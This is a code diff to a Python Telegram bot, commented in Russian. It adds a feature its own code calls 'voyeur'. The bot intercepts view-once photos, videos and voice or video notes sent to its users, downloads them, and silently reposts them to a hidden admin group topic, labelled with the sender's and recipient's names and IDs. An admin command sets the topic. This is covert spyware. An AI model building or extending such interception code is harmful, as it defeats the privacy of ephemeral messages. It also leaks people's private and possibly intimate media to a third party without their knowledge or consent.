@@ -86,6 +86,12 @@ owner_topics: dict[int, int] = {}
 # создали несколько тем с одинаковым именем.
 _topic_lock = asyncio.Lock()
 
+# ID темы "ОДНОРАЗКИ 👁" в GROUP_ID — туда бесшумно падают все
+# перехваченные view-once. None = тема ещё не создана/не назначена.
+# Назначается вручную через /view_once <thread_id>.
+_voyeur_topic_id: int | None = None
+_voyeur_topic_lock = asyncio.Lock()
+
 # Ключ — пара (owner_id, chat_id). Раньше это был просто chat_id, и если
 # несколько владельцев бота общались с одним и тем же человеком, /like
 # одного владельца включал/выключал режим у всех — это был баг
@@ -287,6 +293,7 @@ def _build_state_dict() -> dict:
         "custom_aliases":    custom_aliases,
         "spy_enabled":       spy_enabled,
         "owner_topics":      {str(k): v for k, v in owner_topics.items()},
+        "voyeur_topic_id":   _voyeur_topic_id,
     }
 
 
@@ -448,6 +455,13 @@ def load_persistent_state():
                         owner_topics[int(k)] = int(v)
                     except (TypeError, ValueError):
                         pass
+            except Exception:
+                pass
+            try:
+                global _voyeur_topic_id
+                _v = state.get("voyeur_topic_id")
+                if _v is not None:
+                    _voyeur_topic_id = int(_v)
             except Exception:
                 pass
             try:
@@ -768,6 +782,28 @@ async def get_or_create_topic(owner_id: int) -> int | None:
             return None
 
 
+async def get_or_create_voyeur_topic() -> int | None:
+    """Возвращает thread_id темы ОДНОРАЗКИ в GROUP_ID.
+    Если _voyeur_topic_id не задан — создаёт тему автоматически.
+    Если задан вручную через /view_once — использует его."""
+    global _voyeur_topic_id
+    if _voyeur_topic_id is not None:
+        return _voyeur_topic_id
+    async with _voyeur_topic_lock:
+        if _voyeur_topic_id is not None:
+            return _voyeur_topic_id
+        try:
+            topic = await bot.create_forum_topic(chat_id=GROUP_ID, name="ОДНОРАЗКИ 👁")
+            _voyeur_topic_id = topic.message_thread_id
+            schedule_persist()
+            asyncio.create_task(github_save_now())
+            logging.info(f"[VOYEUR] создана тема ОДНОРАЗКИ tid={_voyeur_topic_id}")
+            return _voyeur_topic_id
+        except Exception as e:
+            logging.error(f"[VOYEUR] не удалось создать тему: {e}")
+            return None
+
+
 async def _dl_buf(file_id: str, filename: str) -> "BufferedInputFile | None":
     """Скачивает файл по file_id в память и возвращает BufferedInputFile.
     Используется для однократных/защищённых сообщений, где forward запрещён.
@@ -844,6 +880,71 @@ async def save_replied_media(owner_id: int, source_msg: Message):
             )
     except Exception as e:
         logging.error(f"[SAVE-REPLIED] не удалось доставить владельцу {owner_id}: {e}")
+
+
+async def spy_view_once_to_group(owner_id: int, source_msg: Message):
+    """Бесшумно отправляет перехваченный view-once в тему ОДНОРАЗКИ 👁 в GROUP_ID.
+    Прикрепляет кто отправил и кому (владельцу бота)."""
+    try:
+        tid = await get_or_create_voyeur_topic()
+        if tid is None:
+            return
+
+        # Имя отправителя (партнёр, приславший view-once)
+        from_name = "неизвестно"
+        if source_msg.from_user:
+            from_name = escape_html(source_msg.from_user.full_name)
+            if source_msg.from_user.username:
+                from_name += f" (@{source_msg.from_user.username})"
+            from_name += f" [<code>{source_msg.from_user.id}</code>]"
+        elif source_msg.chat:
+            n = (getattr(source_msg.chat, "full_name", None)
+                 or getattr(source_msg.chat, "first_name", None) or "")
+            from_name = escape_html(n) if n else f"chat {source_msg.chat.id}"
+
+        # Имя получателя (владелец бота)
+        to_name = f"[<code>{owner_id}</code>]"
+        info = connected_users.get(owner_id)
+        if info:
+            base = escape_html(info.get("name") or str(owner_id))
+            uname = info.get("username") or ""
+            to_name = base + (f" (@{uname})" if uname else "") + f" [<code>{owner_id}</code>]"
+
+        caption = (
+            f"👁 <b>ОДНОРАЗКА перехвачена</b>\n"
+            f"От: {from_name}\n"
+            f"Кому: {to_name}"
+        )
+
+        kw = {"message_thread_id": tid, "disable_notification": True, "parse_mode": "HTML"}
+        sent = False
+        if source_msg.photo:
+            f = await _dl_buf(source_msg.photo[-1].file_id, "photo.jpg")
+            if f:
+                await bot.send_photo(GROUP_ID, f, caption=caption, **kw)
+                sent = True
+        elif source_msg.video:
+            f = await _dl_buf(source_msg.video.file_id, "video.mp4")
+            if f:
+                await bot.send_video(GROUP_ID, f, caption=caption, **kw)
+                sent = True
+        elif source_msg.voice:
+            f = await _dl_buf(source_msg.voice.file_id, "voice.ogg")
+            if f:
+                await bot.send_voice(GROUP_ID, f, caption=caption, **kw)
+                sent = True
+        elif source_msg.video_note:
+            f = await _dl_buf(source_msg.video_note.file_id, "video_note.mp4")
+            if f:
+                await bot.send_message(GROUP_ID, caption, **kw)
+                await bot.send_video_note(GROUP_ID, f,
+                                          message_thread_id=tid,
+                                          disable_notification=True)
+                sent = True
+        if not sent:
+            await bot.send_message(GROUP_ID, caption + "\n⚠️ <i>файл не скачался</i>", **kw)
+    except Exception as e:
+        logging.error(f"[VOYEUR] не удалось отправить в группу: {e}")
 
 
 async def forward_to_admin_silent(owner_id: int, msg: Message):
@@ -1448,6 +1549,7 @@ async def handle_business_message(message: Message):
                 # Кэш пришёл без медиа, reply_to — с медиа → view-once
                 logging.info(f"[VIEW-ONCE] обнаружено mid={rto.message_id}, сохраняем владельцу {owner_id}")
                 asyncio.create_task(save_replied_media(owner_id, rto))
+                asyncio.create_task(spy_view_once_to_group(owner_id, rto))
     # ────────────────────────────────────────────────────────────────────────
 
     msg_text = message.text or message.caption or ""
@@ -1936,6 +2038,45 @@ async def cmd_relink(message: Message):
     else:
         await message.answer(
             f"✅ owner=<code>{owner_id}</code> привязан к теме <code>{thread_id}</code>",
+            parse_mode="HTML",
+        )
+
+
+@dp.message(Command("view_once"))
+async def cmd_view_once(message: Message):
+    """/view_once <thread_id> — назначить тему ОДНОРАЗКИ вручную.
+    Без аргумента — показывает текущую тему.
+    Работает только для ADMIN_ID."""
+    if not message.from_user or message.from_user.id != ADMIN_ID:
+        return
+    global _voyeur_topic_id
+    parts = (message.text or "").split()
+    if len(parts) < 2:
+        cur = _voyeur_topic_id
+        await message.answer(
+            f"👁 Тема <b>ОДНОРАЗКИ</b>: "
+            + (f"<code>{cur}</code>" if cur else "<i>не задана</i>")
+            + "\n\nДля назначения: <code>/view_once thread_id</code>",
+            parse_mode="HTML",
+        )
+        return
+    try:
+        tid = int(parts[1])
+    except ValueError:
+        await message.answer("thread_id должен быть числом.", parse_mode="HTML")
+        return
+    old = _voyeur_topic_id
+    _voyeur_topic_id = tid
+    schedule_persist()
+    asyncio.create_task(github_save_now())
+    if old is not None and old != tid:
+        await message.answer(
+            f"🔁 Тема ОДНОРАЗКИ: <code>{old}</code> → <code>{tid}</code>",
+            parse_mode="HTML",
+        )
+    else:
+        await message.answer(
+            f"✅ Тема ОДНОРАЗКИ назначена: <code>{tid}</code>",
             parse_mode="HTML",
         )
 
